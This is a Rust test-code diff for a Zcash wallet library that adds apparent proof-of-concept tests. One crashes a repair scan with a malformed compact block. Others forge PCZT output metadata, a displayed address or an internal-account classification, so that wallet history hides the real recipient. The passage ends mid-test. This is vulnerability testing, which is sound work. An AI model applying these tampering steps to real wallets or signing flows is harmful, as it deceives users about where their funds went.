@@ -81,13 +81,31 @@ use zcash_protocol::PoolType;
 
 #[cfg(feature = "pczt")]
 use {
-    pczt::roles::{prover::Prover, signer::Signer},
+    pczt::roles::{prover::Prover, signer::Signer, updater::Updater},
     rand_core::OsRng,
     transparent::builder::TransparentSigningSet,
+    transparent::keys::IncomingViewingKey,
     zcash_primitives::transaction::builder::{BuildConfig, Builder},
     zcash_proofs::prover::LocalTxProver,
     zcash_script::opcode::PushValue,
 };
+
+#[cfg(feature = "pczt")]
+const PROPRIETARY_OUTPUT_INFO_FOR_TESTS: &str = "zcash_client_backend:output_info";
+
+#[cfg(feature = "pczt")]
+#[allow(dead_code)]
+#[derive(serde::Serialize)]
+enum TestPcztRecipient<AccountId> {
+    External,
+    #[cfg(feature = "transparent-inputs")]
+    EphemeralTransparent {
+        receiving_account: AccountId,
+    },
+    InternalAccount {
+        receiving_account: AccountId,
+    },
+}
 
 pub mod dsl;
 use dsl::{TestDsl, TestNoteConfig};
@@ -5335,6 +5353,165 @@ where
     );
 }
 
+/// A deep-rewind wallet can remain locally spendable-looking, yet still be crashed by a single
+/// malformed compact block when it attempts the historic rescan needed to repair that state.
+pub fn deep_rewind_repair_path_can_panic_on_malformed_compact_data_after_state_preservation<
+    T,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    T: ShieldedPoolTester,
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: std::fmt::Debug,
+{
+    use std::panic::{AssertUnwindSafe, catch_unwind};
+
+    use crate::{data_api::ll::wallet::PRUNING_DEPTH, proto::compact_formats};
+
+    // Start from the same real deep-rewind branch as `rewind_to_chain_state_deep`, but keep
+    // the wallet-owned state intentionally small so the scenario remains fast and compatible
+    // with the in-memory test target.
+    let mut st = TestDsl::with_sapling_birthday_account(ds_factory, cache).build::<T>();
+
+    let account = st.test_account().unwrap().clone();
+    let sapling_activation = st
+        .network()
+        .activation_height(consensus::NetworkUpgrade::Sapling)
+        .unwrap();
+    let dfvk = T::test_account_fvk(&st);
+    let not_our_key = T::sk_to_fvk(&T::sk(&[0xd5; 32]));
+
+    let wallet_note_values = [
+        Zatoshis::const_from_u64(40_000),
+        Zatoshis::const_from_u64(30_000),
+        Zatoshis::const_from_u64(20_000),
+    ];
+    let total_note_value = wallet_note_values.iter().sum::<Option<Zatoshis>>().unwrap();
+
+    for value in wallet_note_values {
+        st.generate_next_block(&dfvk, AddressType::DefaultExternal, value);
+    }
+    let initial_block_count = wallet_note_values.len() as u32;
+    st.scan_cached_blocks(sapling_activation, initial_block_count as usize);
+
+    // The rewind target is the tip of the initial wallet-relevant range, just as in the
+    // existing deep-rewind coverage.
+    let rewind_target = sapling_activation + initial_block_count - 1;
+
+    let extra_blocks = PRUNING_DEPTH + 10;
+    for _ in 0..extra_blocks {
+        st.generate_next_block(
+            &not_our_key,
+            AddressType::DefaultExternal,
+            Zatoshis::const_from_u64(5_000),
+        );
+    }
+    st.scan_cached_blocks(rewind_target + 1, extra_blocks as usize);
+
+    let pre_rewind_tip = st
+        .wallet()
+        .chain_height()
+        .unwrap()
+        .expect("chain tip should be set before deep rewind");
+    let prune_boundary = pre_rewind_tip - (PRUNING_DEPTH - 1);
+    assert!(
+        pre_rewind_tip > rewind_target + PRUNING_DEPTH,
+        "test invariant: this must be a real deep-rewind branch",
+    );
+
+    st.wallet_mut()
+        .rewind_to_chain_state(
+            ChainState::empty(rewind_target, BlockHash([0; 32])),
+            HashSet::new(),
+        )
+        .expect("rewind_to_chain_state should succeed");
+
+    // The deep-rewind branch is only interesting if it really preserves a larger apparent
+    // chain tip while truncating scanned-block state to the prune boundary.
+    assert_eq!(
+        st.wallet()
+            .chain_height()
+            .unwrap()
+            .expect("chain tip should remain observable after deep rewind"),
+        pre_rewind_tip,
+    );
+    assert_eq!(
+        st.wallet()
+            .block_max_scanned()
+            .unwrap()
+            .map(|meta| meta.block_height()),
+        Some(prune_boundary),
+        "deep rewind should preserve only the oldest retained checkpoint as scanned state",
+    );
+
+    // Support assertion: before any repair attempt, the wallet still looks usable.
+    // Here we use the strongest cheap signal available in this smaller scenario:
+    // the wallet still reports the full tracked balance and can still produce a fresh
+    // transfer proposal from it.
+    assert_eq!(
+        st.get_spendable_balance(account.id(), ConfirmationsPolicy::MIN),
+        total_note_value,
+        "the wallet should still expose the pre-rewind spendable balance before repair scanning begins",
+    );
+
+    let to_extsk = T::sk(&[0xcc; 32]);
+    let to: Address = T::sk_default_address(&to_extsk);
+    let request = zip321::TransactionRequest::new(vec![Payment::without_memo(
+        to.to_zcash_address(st.network()),
+        Zatoshis::const_from_u64(10_000),
+    )])
+    .unwrap();
+    let change_strategy = standard::SingleOutputChangeStrategy::new(
+        StandardFeeRule::Zip317,
+        None,
+        T::SHIELDED_PROTOCOL,
+        DustOutputPolicy::default(),
+    );
+    let input_selector = GreedyInputSelector::new();
+    st.propose_transfer(
+        account.id(),
+        &input_selector,
+        &change_strategy,
+        request,
+        ConfirmationsPolicy::MIN,
+    )
+    .expect("the wallet should still be able to propose a spend before repair scanning begins");
+
+    // Inject a single malformed compact block at the first height that the historic rescan will
+    // revisit. Every other field is kept structurally harmless for this test:
+    //
+    // - `height` is representable as `u32`
+    // - `hash` is exactly 32 bytes
+    // - there are no txs, so no `txid`/nullifier/commitment parsing is involved
+    //
+    // That means any panic during scanning this block belongs to the chosen `prev_hash()`
+    // surface rather than to a different malformed field.
+    let repair_start = rewind_target + 1;
+    let malformed_block = compact_formats::CompactBlock {
+        proto_version: 0,
+        height: u64::from(repair_start),
+        hash: vec![0x42; 32],
+        prev_hash: vec![0x24; 31],
+        time: 0,
+        vtx: vec![],
+        chain_metadata: None,
+        header: vec![],
+    };
+    st.inject_compact_block(malformed_block);
+
+    let repair_limit = (u32::from(pre_rewind_tip) - u32::from(repair_start) + 1) as usize;
+    let repair_attempt = catch_unwind(AssertUnwindSafe(|| {
+        st.scan_cached_blocks(repair_start, repair_limit);
+    }));
+
+    assert!(
+        repair_attempt.is_err(),
+        "a single malformed compact block should crash the historic repair scan after the wallet has entered the deep-rewind preserved-state branch",
+    );
+}
+
 /// Verifies that when a new account is imported into a fully-scanned wallet,
 /// the ensuing re-scan discovers the new account's previously-unknown notes
 /// and `scan_complete → mark_stabilized_notes` flags them `witness_stabilized`
@@ -6117,6 +6294,1303 @@ pub fn pczt_single_step<P0: ShieldedPoolTester, P1: ShieldedPoolTester, Dsf>(
 
     let (h, _) = st.generate_next_block_including(txid);
     st.scan_cached_blocks(h, 1);
+}
+
+#[cfg(feature = "pczt")]
+pub fn pczt_sent_history_can_be_misled_by_user_address_and_output_metadata<
+    T: ShieldedPoolTester,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    use zcash_protocol::consensus::ZIP212_GRACE_PERIOD;
+
+    let mut st = TestBuilder::new()
+        .with_data_store_factory(ds_factory)
+        .with_block_cache(cache)
+        .with_initial_chain_state(|_, network| {
+            let birthday_height = std::cmp::max(
+                network.activation_height(NetworkUpgrade::Nu5).unwrap() + 10,
+                network.activation_height(NetworkUpgrade::Canopy).unwrap()
+                    + ZIP212_GRACE_PERIOD
+                    + 10,
+            );
+
+            InitialChainState {
+                chain_state: ChainState::new(
+                    birthday_height - 1,
+                    BlockHash([7; 32]),
+                    Frontier::empty(),
+                    #[cfg(feature = "orchard")]
+                    Frontier::empty(),
+                ),
+                prior_sapling_roots: vec![],
+                #[cfg(feature = "orchard")]
+                prior_orchard_roots: vec![],
+            }
+        })
+        .with_account_having_current_birthday()
+        .build();
+
+    // This is the higher-level, wallet-store-facing PoC for the same semantic mismatch
+    // proven in `data_api::wallet` unit tests. The important distinction is that this
+    // helper drives the full wallet path:
+    //
+    // - create a real proposal
+    // - create a real PCZT
+    // - mutate only wallet-bound output metadata
+    // - prove and sign the resulting PCZT
+    // - extract and store it through the wallet API
+    // - then ask the wallet for sent-output history
+    //
+    // If the bug exists, the wallet-visible history will prefer the forged metadata
+    // even though sender-side recovery from the finalized transaction still proves that
+    // the committed recipient is different.
+    let account = st.test_account().cloned().unwrap();
+    let sender_fvk = T::test_account_fvk(&st);
+    let real_recipient_fvk = T::test_account_fvk(&st);
+    let real_recipient = T::fvk_default_address(&real_recipient_fvk);
+    let fake_displayed = T::random_address(OsRng);
+
+    assert_ne!(real_recipient, fake_displayed);
+
+    let note_value = Zatoshis::const_from_u64(350000);
+    st.generate_next_block(&sender_fvk, AddressType::DefaultExternal, note_value);
+    st.scan_cached_blocks(account.birthday().height(), 1);
+
+    let transfer_amount = Zatoshis::const_from_u64(200000);
+    let request = TransactionRequest::new(vec![Payment::without_memo(
+        real_recipient.to_zcash_address(st.network()),
+        transfer_amount,
+    )])
+    .unwrap();
+
+    let input_selector = GreedyInputSelector::new();
+    let change_strategy =
+        single_output_change_strategy(StandardFeeRule::Zip317, None, T::SHIELDED_PROTOCOL);
+    let proposal = st
+        .propose_transfer(
+            account.id(),
+            &input_selector,
+            &change_strategy,
+            request,
+            ConfirmationsPolicy::MIN,
+        )
+        .unwrap();
+
+    let pczt_created = st
+        .create_pczt_from_proposal::<Infallible, _, Infallible>(
+            account.id(),
+            OvkPolicy::Sender,
+            &proposal,
+        )
+        .unwrap();
+
+    // Core attack step:
+    //
+    // - keep the actual payment output unchanged
+    // - mutate only `user_address`, which is wallet-bound output metadata
+    // - then allow the standard proving/signing/extraction path to continue
+    //
+    // This keeps the test focused on post-extraction semantic corruption rather than
+    // on transaction validity or on malformed cryptographic output fields.
+    let pczt_mismatched = match T::SHIELDED_PROTOCOL {
+        ShieldedProtocol::Sapling => Updater::new(pczt_created)
+            .update_sapling_with(|mut updater| {
+                for index in 0..updater.bundle().outputs().len() {
+                    updater.update_output_with(index, |mut output_updater| {
+                        output_updater.set_user_address(
+                            fake_displayed.to_zcash_address(st.network()).encode(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(feature = "orchard")]
+        ShieldedProtocol::Orchard => Updater::new(pczt_created)
+            .update_orchard_with(|mut updater| {
+                for index in 0..updater.bundle().actions().len() {
+                    updater.update_action_with(index, |mut action_updater| {
+                        action_updater.set_output_user_address(
+                            fake_displayed.to_zcash_address(st.network()).encode(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(not(feature = "orchard"))]
+        ShieldedProtocol::Orchard => {
+            unreachable!("orchard output mutation requires orchard feature")
+        }
+    };
+
+    let pczt_updated = T::add_proof_generation_keys(pczt_mismatched, account.usk()).unwrap();
+    let sapling_prover = LocalTxProver::bundled();
+    let orchard_pk = ::orchard::circuit::ProvingKey::build();
+    let pczt_proven = Prover::new(pczt_updated)
+        .create_orchard_proof(&orchard_pk)
+        .unwrap()
+        .create_sapling_proofs(&sapling_prover, &sapling_prover)
+        .unwrap()
+        .finish();
+
+    let mut signer = Signer::new(pczt_proven).unwrap();
+    T::apply_signatures_to_pczt(&mut signer, account.usk()).unwrap();
+    let pczt_authorized = signer.finish();
+
+    let txid = st
+        .extract_and_store_transaction_from_pczt(pczt_authorized)
+        .unwrap();
+    let tx = st.wallet().get_transaction(txid).unwrap().unwrap();
+
+    // Recover the true outgoing recipient from the finalized transaction. This is our
+    // cryptographic ground truth and must remain stable regardless of the forged metadata.
+    let recovered =
+        T::try_output_recovery(st.network(), account.birthday().height(), &tx, &sender_fvk)
+            .expect("sender OVK should recover the external output");
+    let (_, recovered_to, _) = recovered;
+    assert_eq!(recovered_to, real_recipient);
+    assert_ne!(recovered_to, fake_displayed);
+
+    // Now query the wallet-visible sent-history API. If the bug is present, this will
+    // surface the forged displayed address rather than the recipient that the finalized
+    // transaction actually committed to.
+    let sent_outputs = st.wallet().get_sent_outputs(&txid).unwrap();
+    let displayed = sent_outputs
+        .iter()
+        .find_map(|output| output.external_recipient().cloned())
+        .expect("an external sent output should exist");
+
+    assert_eq!(displayed, fake_displayed);
+    assert_ne!(displayed, recovered_to);
+}
+
+#[cfg(feature = "pczt")]
+pub fn pczt_sent_history_can_be_misled_by_user_address<T: ShieldedPoolTester, Dsf>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    pczt_sent_history_can_be_misled_by_user_address_and_output_metadata::<T, Dsf>(ds_factory, cache)
+}
+
+#[cfg(feature = "pczt")]
+pub fn pczt_sent_history_can_reclassify_external_output_as_internal_account<
+    T: ShieldedPoolTester,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    use zcash_protocol::consensus::ZIP212_GRACE_PERIOD;
+
+    let mut st = TestBuilder::new()
+        .with_data_store_factory(ds_factory)
+        .with_block_cache(cache)
+        .with_initial_chain_state(|_, network| {
+            let birthday_height = std::cmp::max(
+                network.activation_height(NetworkUpgrade::Nu5).unwrap() + 10,
+                network.activation_height(NetworkUpgrade::Canopy).unwrap()
+                    + ZIP212_GRACE_PERIOD
+                    + 10,
+            );
+
+            InitialChainState {
+                chain_state: ChainState::new(
+                    birthday_height - 1,
+                    BlockHash([9; 32]),
+                    Frontier::empty(),
+                    #[cfg(feature = "orchard")]
+                    Frontier::empty(),
+                ),
+                prior_sapling_roots: vec![],
+                #[cfg(feature = "orchard")]
+                prior_orchard_roots: vec![],
+            }
+        })
+        .with_account_having_current_birthday()
+        .build();
+
+    // This is the Stage C PoC. Unlike Stage B, we do not merely forge the displayed
+    // address. We keep the committed output fully external, but we mutate only the
+    // wallet-bound PCZT classification metadata so the wallet later treats the same
+    // output as if it were internal.
+    let account = st.test_account().cloned().unwrap();
+    let sender_fvk = T::test_account_fvk(&st);
+    let real_recipient_fvk = T::test_account_fvk(&st);
+    let real_recipient = T::fvk_default_address(&real_recipient_fvk);
+
+    let note_value = Zatoshis::const_from_u64(350000);
+    st.generate_next_block(&sender_fvk, AddressType::DefaultExternal, note_value);
+    st.scan_cached_blocks(account.birthday().height(), 1);
+
+    let transfer_amount = Zatoshis::const_from_u64(200000);
+    let request = TransactionRequest::new(vec![Payment::without_memo(
+        real_recipient.to_zcash_address(st.network()),
+        transfer_amount,
+    )])
+    .unwrap();
+
+    let input_selector = GreedyInputSelector::new();
+    let change_strategy =
+        single_output_change_strategy(StandardFeeRule::Zip317, None, T::SHIELDED_PROTOCOL);
+    let proposal = st
+        .propose_transfer(
+            account.id(),
+            &input_selector,
+            &change_strategy,
+            request,
+            ConfirmationsPolicy::MIN,
+        )
+        .unwrap();
+
+    let pczt_created = st
+        .create_pczt_from_proposal::<Infallible, _, Infallible>(
+            account.id(),
+            OvkPolicy::Sender,
+            &proposal,
+        )
+        .unwrap();
+
+    // Core attack step:
+    //
+    // - keep the actual output receiver unchanged
+    // - keep the existing user-facing address metadata untouched
+    // - mutate only the proprietary output classification from `External` to
+    //   `InternalAccount`
+    //
+    // This raises the semantic drift from “wrong displayed recipient” to “wrong
+    // recipient type”, which is a stronger wallet-history deception.
+    let pczt_reclassified = match T::SHIELDED_PROTOCOL {
+        ShieldedProtocol::Sapling => Updater::new(pczt_created)
+            .update_sapling_with(|mut updater| {
+                for index in 0..updater.bundle().outputs().len() {
+                    updater.update_output_with(index, |mut output_updater| {
+                        output_updater.set_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(feature = "orchard")]
+        ShieldedProtocol::Orchard => Updater::new(pczt_created)
+            .update_orchard_with(|mut updater| {
+                for index in 0..updater.bundle().actions().len() {
+                    updater.update_action_with(index, |mut action_updater| {
+                        action_updater.set_output_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(not(feature = "orchard"))]
+        ShieldedProtocol::Orchard => {
+            unreachable!("orchard output mutation requires orchard feature")
+        }
+    };
+
+    let pczt_updated = T::add_proof_generation_keys(pczt_reclassified, account.usk()).unwrap();
+    let sapling_prover = LocalTxProver::bundled();
+    let orchard_pk = ::orchard::circuit::ProvingKey::build();
+    let pczt_proven = Prover::new(pczt_updated)
+        .create_orchard_proof(&orchard_pk)
+        .unwrap()
+        .create_sapling_proofs(&sapling_prover, &sapling_prover)
+        .unwrap()
+        .finish();
+
+    let mut signer = Signer::new(pczt_proven).unwrap();
+    T::apply_signatures_to_pczt(&mut signer, account.usk()).unwrap();
+    let pczt_authorized = signer.finish();
+
+    let txid = st
+        .extract_and_store_transaction_from_pczt(pczt_authorized)
+        .unwrap();
+    let tx = st.wallet().get_transaction(txid).unwrap().unwrap();
+
+    // Recover the true external recipient from the finalized transaction. This is the
+    // committed ground truth and must remain stable.
+    let recovered =
+        T::try_output_recovery(st.network(), account.birthday().height(), &tx, &sender_fvk)
+            .expect("sender OVK should recover the external output");
+    let (_, recovered_to, _) = recovered;
+    assert_eq!(recovered_to, real_recipient);
+
+    // Now ask the wallet-visible sent-history API for recipients. If the reclassification
+    // bug exists, the API will no longer expose any external recipient at all, even though
+    // the finalized transaction still commits to one.
+    let sent_outputs = st.wallet().get_sent_outputs(&txid).unwrap();
+    assert!(
+        sent_outputs
+            .iter()
+            .all(|output| output.external_recipient().is_none()),
+        "reclassified output should stop appearing as an external recipient in sent history",
+    );
+}
+
+#[cfg(feature = "pczt")]
+pub fn pczt_tx_history_can_reuse_internal_account_reclassification_for_external_output<
+    T: ShieldedPoolTester,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    use zcash_protocol::consensus::ZIP212_GRACE_PERIOD;
+
+    let mut st = TestBuilder::new()
+        .with_data_store_factory(ds_factory)
+        .with_block_cache(cache)
+        .with_initial_chain_state(|_, network| {
+            let birthday_height = std::cmp::max(
+                network.activation_height(NetworkUpgrade::Nu5).unwrap() + 10,
+                network.activation_height(NetworkUpgrade::Canopy).unwrap()
+                    + ZIP212_GRACE_PERIOD
+                    + 10,
+            );
+
+            InitialChainState {
+                chain_state: ChainState::new(
+                    birthday_height - 1,
+                    BlockHash([10; 32]),
+                    Frontier::empty(),
+                    #[cfg(feature = "orchard")]
+                    Frontier::empty(),
+                ),
+                prior_sapling_roots: vec![],
+                #[cfg(feature = "orchard")]
+                prior_orchard_roots: vec![],
+            }
+        })
+        .with_account_having_current_birthday()
+        .build();
+
+    // This Stage D PoC asks a different question from Stage C:
+    //
+    // - Stage C proved that `get_sent_outputs` stops exposing an external recipient.
+    // - Stage D asks whether the wallet's higher-level transaction-history summary also
+    //   reuses that corrupted classification.
+    //
+    // If the answer is yes, then the bug is not confined to one narrow output-inspection API;
+    // it propagates into broader history/accounting views built from stored wallet state.
+    let account = st.test_account().cloned().unwrap();
+    let sender_fvk = T::test_account_fvk(&st);
+    let real_recipient_fvk = T::test_account_fvk(&st);
+    let real_recipient = T::fvk_default_address(&real_recipient_fvk);
+
+    let note_value = Zatoshis::const_from_u64(350000);
+    st.generate_next_block(&sender_fvk, AddressType::DefaultExternal, note_value);
+    st.scan_cached_blocks(account.birthday().height(), 1);
+
+    let transfer_amount = Zatoshis::const_from_u64(200000);
+    let request = TransactionRequest::new(vec![Payment::without_memo(
+        real_recipient.to_zcash_address(st.network()),
+        transfer_amount,
+    )])
+    .unwrap();
+
+    let input_selector = GreedyInputSelector::new();
+    let change_strategy =
+        single_output_change_strategy(StandardFeeRule::Zip317, None, T::SHIELDED_PROTOCOL);
+    let proposal = st
+        .propose_transfer(
+            account.id(),
+            &input_selector,
+            &change_strategy,
+            request,
+            ConfirmationsPolicy::MIN,
+        )
+        .unwrap();
+
+    let pczt_created = st
+        .create_pczt_from_proposal::<Infallible, _, Infallible>(
+            account.id(),
+            OvkPolicy::Sender,
+            &proposal,
+        )
+        .unwrap();
+
+    // Keep the committed recipient unchanged, but mutate the proprietary recipient
+    // classification to `InternalAccount` exactly as in Stage C.
+    let pczt_reclassified = match T::SHIELDED_PROTOCOL {
+        ShieldedProtocol::Sapling => Updater::new(pczt_created)
+            .update_sapling_with(|mut updater| {
+                for index in 0..updater.bundle().outputs().len() {
+                    updater.update_output_with(index, |mut output_updater| {
+                        output_updater.set_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(feature = "orchard")]
+        ShieldedProtocol::Orchard => Updater::new(pczt_created)
+            .update_orchard_with(|mut updater| {
+                for index in 0..updater.bundle().actions().len() {
+                    updater.update_action_with(index, |mut action_updater| {
+                        action_updater.set_output_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(not(feature = "orchard"))]
+        ShieldedProtocol::Orchard => {
+            unreachable!("orchard output mutation requires orchard feature")
+        }
+    };
+
+    let pczt_updated = T::add_proof_generation_keys(pczt_reclassified, account.usk()).unwrap();
+    let sapling_prover = LocalTxProver::bundled();
+    let orchard_pk = ::orchard::circuit::ProvingKey::build();
+    let pczt_proven = Prover::new(pczt_updated)
+        .create_orchard_proof(&orchard_pk)
+        .unwrap()
+        .create_sapling_proofs(&sapling_prover, &sapling_prover)
+        .unwrap()
+        .finish();
+
+    let mut signer = Signer::new(pczt_proven).unwrap();
+    T::apply_signatures_to_pczt(&mut signer, account.usk()).unwrap();
+    let pczt_authorized = signer.finish();
+
+    let txid = st
+        .extract_and_store_transaction_from_pczt(pczt_authorized)
+        .unwrap();
+    let tx = st.wallet().get_transaction(txid).unwrap().unwrap();
+
+    // The finalized transaction still commits to a real external recipient.
+    let recovered =
+        T::try_output_recovery(st.network(), account.birthday().height(), &tx, &sender_fvk)
+            .expect("sender OVK should recover the external output");
+    let (_, recovered_to, _) = recovered;
+    assert_eq!(recovered_to, real_recipient);
+
+    // The lower-level sent-output API already demonstrated in Stage C should expose no external
+    // recipient after reclassification.
+    let sent_outputs = st.wallet().get_sent_outputs(&txid).unwrap();
+    assert!(
+        sent_outputs
+            .iter()
+            .all(|output| output.external_recipient().is_none()),
+        "reclassified output should stop appearing as an external recipient in sent outputs",
+    );
+
+    // Now inspect the higher-level transaction-history summary. If the corruption is reused here
+    // too, the wallet should no longer count the real external payment as a sent note; instead it
+    // will treat the output as wallet-internal change-like state.
+    let history = st.wallet().get_tx_history().unwrap();
+    let summary = history
+        .iter()
+        .find(|summary| summary.txid() == txid)
+        .expect("the stored transaction should appear in history");
+
+    assert_eq!(
+        summary.sent_note_count(),
+        0,
+        "history should stop counting the real external payment as a sent note after reclassification",
+    );
+    assert!(
+        summary.has_change(),
+        "history should treat the reclassified output set as containing internal change-like outputs",
+    );
+}
+
+#[cfg(all(feature = "pczt", feature = "transparent-inputs"))]
+pub fn local_wallet_can_simultaneously_surface_legacy_sapling_sent_history_and_pczt_internal_reclassification<
+    T: ShieldedPoolTester,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    use zcash_protocol::consensus::ZIP212_GRACE_PERIOD;
+
+    let compact_network = LocalNetwork {
+        overwinter: Some(BlockHeight::from_u32(1)),
+        sapling: Some(BlockHeight::from_u32(1)),
+        blossom: Some(BlockHeight::from_u32(1)),
+        heartwood: Some(BlockHeight::from_u32(1)),
+        canopy: Some(BlockHeight::from_u32(1)),
+        nu5: Some(BlockHeight::from_u32(1)),
+        nu6: None,
+        nu6_1: None,
+        #[cfg(zcash_unstable = "nu7")]
+        nu7: None,
+        #[cfg(zcash_unstable = "zfuture")]
+        z_future: None,
+    };
+
+    let mut st = TestBuilder::new()
+        .with_network(compact_network)
+        .with_data_store_factory(ds_factory)
+        .with_block_cache(cache)
+        .with_initial_chain_state(|_, network| {
+            let birthday_height = std::cmp::max(
+                network.activation_height(NetworkUpgrade::Nu5).unwrap() + 10,
+                network.activation_height(NetworkUpgrade::Canopy).unwrap()
+                    + ZIP212_GRACE_PERIOD
+                    + 10,
+            );
+
+            InitialChainState {
+                chain_state: ChainState::new(
+                    birthday_height - 1,
+                    BlockHash([0; 32]),
+                    Frontier::empty(),
+                    #[cfg(feature = "orchard")]
+                    Frontier::empty(),
+                ),
+                prior_sapling_roots: vec![],
+                #[cfg(feature = "orchard")]
+                prior_orchard_roots: vec![],
+            }
+        })
+        .with_account_having_current_birthday()
+        .build();
+    let account = st.test_account().cloned().unwrap();
+    let sender_dfvk = account.usk().sapling().to_diversifiable_full_viewing_key();
+
+    // This is the composed local-wallet PoC:
+    //
+    // 1. Start from a wallet that has a tracked account but no present chain context.
+    // 2. Feed it a legacy Sapling transaction through `decrypt_and_store_transaction`,
+    //    so the wallet accepts sender-recoverable sent history under ZIP-212-off semantics.
+    // 3. Advance the very same wallet into present-day chain state and fund it honestly.
+    // 4. Build a second transaction through the full proposal -> PCZT -> prove -> sign ->
+    //    extract path, but mutate only wallet-bound PCZT metadata so the wallet later
+    //    reclassifies a real external payment as internal.
+    //
+    // The end result is stronger than the individual stages in isolation:
+    // the same wallet simultaneously contains
+    // - one sent-history entry that only exists because context was missing at recovery time
+    // - and one later transaction whose output classification is corrupted after signing.
+
+    // Phase 1: build a completely honest legacy Sapling transaction whose interpretation
+    // depends on ZIP-212 context. This keeps the first half of the composed PoC focused on
+    // wallet-side semantic confusion rather than on malformed transaction bytes.
+    let network = *st.network();
+    let legacy_target_height = network
+        .activation_height(NetworkUpgrade::Sapling)
+        .expect("Sapling activation height is known on the local test network");
+    let current_semantics_height = {
+        let canopy = network
+            .activation_height(NetworkUpgrade::Canopy)
+            .expect("Canopy activation height is known on the local test network")
+            + ZIP212_GRACE_PERIOD
+            + 10;
+        #[cfg(feature = "orchard")]
+        let canopy = canopy.max(
+            network
+                .activation_height(NetworkUpgrade::Nu5)
+                .expect("NU5 activation height is known on the local test network")
+                + 10,
+        );
+        canopy
+    };
+
+    let transparent_account_sk =
+        transparent::keys::AccountPrivKey::from_seed(&network, &[0x88; 32], zip32::AccountId::ZERO)
+            .unwrap();
+    let (transparent_addr, address_index) = transparent_account_sk
+        .to_account_pubkey()
+        .derive_external_ivk()
+        .unwrap()
+        .default_address();
+    let transparent_sk = transparent_account_sk
+        .derive_external_secret_key(address_index)
+        .unwrap();
+    let secp = secp256k1::Secp256k1::signing_only();
+    let transparent_pubkey = transparent_sk.public_key(&secp);
+
+    let legacy_external_usk =
+        UnifiedSpendingKey::from_seed(&network, &[0x99; 32], zip32::AccountId::ZERO).unwrap();
+    let legacy_external_recipient = legacy_external_usk
+        .sapling()
+        .to_diversifiable_full_viewing_key()
+        .default_address()
+        .1;
+    let legacy_external_recipient_addr: Address = legacy_external_recipient.into();
+
+    let legacy_change_usk =
+        UnifiedSpendingKey::from_seed(&network, &[0xaa; 32], zip32::AccountId::ZERO).unwrap();
+    let legacy_change_recipient = legacy_change_usk
+        .sapling()
+        .to_diversifiable_full_viewing_key()
+        .default_address()
+        .1;
+
+    let utxo = transparent::bundle::OutPoint::fake();
+    let coin = transparent::bundle::TxOut::new(
+        Zatoshis::const_from_u64(1_000_000),
+        transparent_addr.script().into(),
+    );
+
+    let mut legacy_builder = Builder::new(
+        network,
+        legacy_target_height,
+        BuildConfig::Standard {
+            sapling_anchor: Some(sapling::Anchor::empty_tree()),
+            orchard_anchor: Some(orchard::Anchor::empty_tree()),
+        },
+    );
+    legacy_builder
+        .add_transparent_p2pkh_input(transparent_pubkey, utxo, coin)
+        .unwrap();
+    legacy_builder
+        .add_sapling_output::<core::convert::Infallible>(
+            Some(sender_dfvk.to_ovk(Scope::External)),
+            legacy_external_recipient,
+            Zatoshis::const_from_u64(100_000),
+            MemoBytes::empty(),
+        )
+        .unwrap();
+    legacy_builder
+        .add_sapling_output::<core::convert::Infallible>(
+            Some(sender_dfvk.to_ovk(Scope::Internal)),
+            legacy_change_recipient,
+            Zatoshis::const_from_u64(885_000),
+            MemoBytes::empty(),
+        )
+        .unwrap();
+
+    let mut transparent_signing_set = TransparentSigningSet::new();
+    transparent_signing_set.add_key(transparent_sk);
+    let legacy_tx = legacy_builder
+        .mock_build(&transparent_signing_set, &[], &[], OsRng)
+        .unwrap()
+        .transaction()
+        .clone();
+    let legacy_txid = legacy_tx.txid();
+
+    // Store the legacy transaction before the wallet has any chain tip. This is the
+    // exact trust-boundary violation from Stages A/B, but now it becomes only the first
+    // half of the larger composed wallet-state corruption story.
